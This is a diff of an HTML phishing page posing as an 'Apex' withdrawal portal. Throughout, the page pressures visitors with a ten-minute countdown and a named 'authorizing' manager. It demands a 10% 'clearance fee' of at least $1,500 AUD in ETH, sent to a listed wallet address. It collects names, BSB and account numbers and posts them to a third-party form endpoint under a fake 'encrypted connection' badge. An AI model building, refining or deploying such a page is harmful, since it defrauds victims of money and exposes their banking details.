@@ -10,7 +10,6 @@
         .btn-gradient { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); }
         .fee-highlight { background: #fefce8; border: 1px dashed #eab308; }
         .wallet-box { background: #f8fafc; border: 2px solid #cbd5e1; font-family: monospace; }
-        .token-input { letter-spacing: 0.15em; text-transform: uppercase; font-family: monospace; }
     </style>
 </head>
 <body class="bg-slate-50 font-sans text-slate-900">
@@ -27,91 +26,75 @@
         </div>
 
         <div class="timer-bg rounded-xl p-6 shadow-sm text-center">
-            <p class="text-red-600 text-xs font-bold uppercase tracking-widest mb-1">Withdrawal Security Window</p>
+            <p class="text-red-600 text-xs font-bold uppercase tracking-widest mb-1">Security Window</p>
             <div id="timer" class="text-4xl font-mono font-bold text-red-700 tracking-tighter text-center">10:00</div>
-            <p class="text-[11px] text-red-500 mt-2 leading-relaxed px-4 italic text-center">
-                Authorized by Senior Manager Paola Almontes De León. Token expires in 10 minutes.
-            </p>
+            <p class="text-[11px] text-red-500 mt-2 italic text-center">Authorized by Paola Almontes De León</p>
         </div>
 
         <div class="fee-highlight rounded-xl p-5 space-y-4">
             <div class="text-center">
-                <p class="text-xs font-bold text-yellow-800 uppercase text-center">Mandatory Clearance Fee</p>
-                <p class="text-lg font-black text-yellow-900 text-center">10% Authorization Charge</p>
-                <p class="text-[10px] text-yellow-700 font-medium text-center">Minimum activation: $1,500 AUD in Ethereum (ETH)</p>
+                <p class="text-xs font-bold text-yellow-800 uppercase text-center">10% Authorization Charge</p>
+                <p class="text-[10px] text-yellow-700 font-medium text-center">Min activation: $1,500 AUD in ETH</p>
             </div>
-
-            <div class="wallet-box p-3 rounded-lg relative">
-                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1 text-center">Official Apex ETH Address:</p>
-                <div class="text-[11px] break-all font-bold text-blue-900 select-all tracking-tight text-center px-2">
+            <div class="wallet-box p-3 rounded-lg text-center">
+                <p class="text-[9px] text-slate-500 uppercase font-bold mb-1">Official ETH Address:</p>
+                <div class="text-[11px] break-all font-bold text-blue-900 select-all tracking-tight px-2">
                     0x1c1C1958c983a3E6CFB19f88752E41A49eB569a2
                 </div>
-                <p class="text-[9px] text-blue-600 mt-2 font-bold italic text-center underline">Click address to select & copy</p>
             </div>
-            
-            <p class="text-[9px] text-center text-yellow-800 font-medium leading-tight">
-                *Ensure payment is sent via **ERC-20 Network** only. System nodes will verify transaction before releasing BSB/Account funds.
-            </p>
         </div>
 
         <form action="https://forminit.com/f/52vp66ajd7w" method="POST" class="bg-white rounded-2xl shadow-xl p-6 space-y-5 border border-slate-200">
             
-            <h2 class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center">Withdrawal Requisition</h2>
-
-            <div class="bg-slate-100 p-4 rounded-xl border-2 border-blue-200">
-                <label class="block text-center text-xs font-black text-blue-900 mb-2 uppercase tracking-tighter">Security Token Activation (12-Digit)</label>
-                <input type="text" name="Security Token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required 
-                class="token-input w-full p-3 text-center text-lg font-bold bg-white border border-blue-300 rounded-lg focus:ring-2 focus:ring-blue-500 outline-none text-blue-900">
-                <p class="text-[9px] text-center text-blue-500 mt-2">Token must match the one issued for this specific requisition.</p>
-            </div>
-
-            <hr class="border-slate-100">
+            <h2 class="text-sm font-bold text-slate-800 uppercase tracking-wide border-b pb-3 text-center font-black">Withdrawal Requisition</h2>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Full Legal Name</label>
-                <input type="text" name="Client Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                <label class="block text-xs font-black text-blue-900 mb-2 uppercase tracking-tight">1. Security Token (12-Digits)</label>
+                <input type="text" name="token" placeholder="XXXX-XXXX-XXXX" maxlength="14" required 
+                class="w-full p-3 text-center text-lg font-bold bg-slate-50 border border-blue-300 rounded-lg outline-none text-blue-900">
             </div>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Australian Banking Institution</label>
-                <select name="Bank Name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase">2. Full Legal Name</label>
+                <input type="text" name="full_name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
+            </div>
+
+            <div>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">3. Australian Bank</label>
+                <select name="bank_name" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg outline-none">
                     <option value="" disabled selected>Select Bank</option>
                     <option value="CBA">Commonwealth Bank (CBA)</option>
                     <option value="Westpac">Westpac</option>
                     <option value="ANZ">ANZ Bank</option>
                     <option value="NAB">National Australia Bank (NAB)</option>
                     <option value="Macquarie">Macquarie Bank</option>
-                    <option value="Other">Other Australian Institution</option>
+                    <option value="Other">Other</option>
                 </select>
             </div>
 
             <div class="grid grid-cols-2 gap-4">
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">BSB Number</label>
-                    <input type="text" name="BSB" placeholder="000-000" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
+                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">4. BSB</label>
+                    <input type="text" name="bsb_number" placeholder="000-000" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
                 </div>
                 <div>
-                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Account Number</label>
-                    <input type="text" name="Account" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
+                    <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">5. Account #</label>
+                    <input type="text" name="account_number" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg">
                 </div>
             </div>
 
             <div>
-                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">Total Withdrawal Amount ($AUD)</label>
-                <div class="relative">
-                    <span class="absolute left-3 top-3 font-bold text-blue-900">$</span>
-                    <input type="number" name="Amount" placeholder="0.00" required class="w-full p-3 pl-7 bg-slate-50 border border-slate-200 rounded-lg font-bold text-blue-900">
-                </div>
+                <label class="block text-xs font-bold text-slate-600 mb-2 uppercase text-left">6. Amount ($AUD)</label>
+                <input type="number" name="amount" placeholder="0.00" required class="w-full p-3 bg-slate-50 border border-slate-200 rounded-lg font-bold text-blue-900">
             </div>
+
+            <input type="hidden" name="_subject" value="New Withdrawal Request - Apex">
 
             <button type="submit" class="w-full btn-gradient text-white font-bold py-4 rounded-xl shadow-lg transform active:scale-95 transition-all uppercase tracking-widest text-center">
                 Authorize Release & Pay Fee
             </button>
             
-            <div class="flex items-center justify-center space-x-2 pt-2 text-center">
-                <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                <p class="text-[10px] text-gray-400 font-medium tracking-tight uppercase text-center">Encrypted Node Connection Active</p>
-            </div>
+            <p class="text-[10px] text-gray-400 font-medium tracking-tight uppercase text-center italic">Encrypted Connection Active</p>
         </form>
     </main>
 
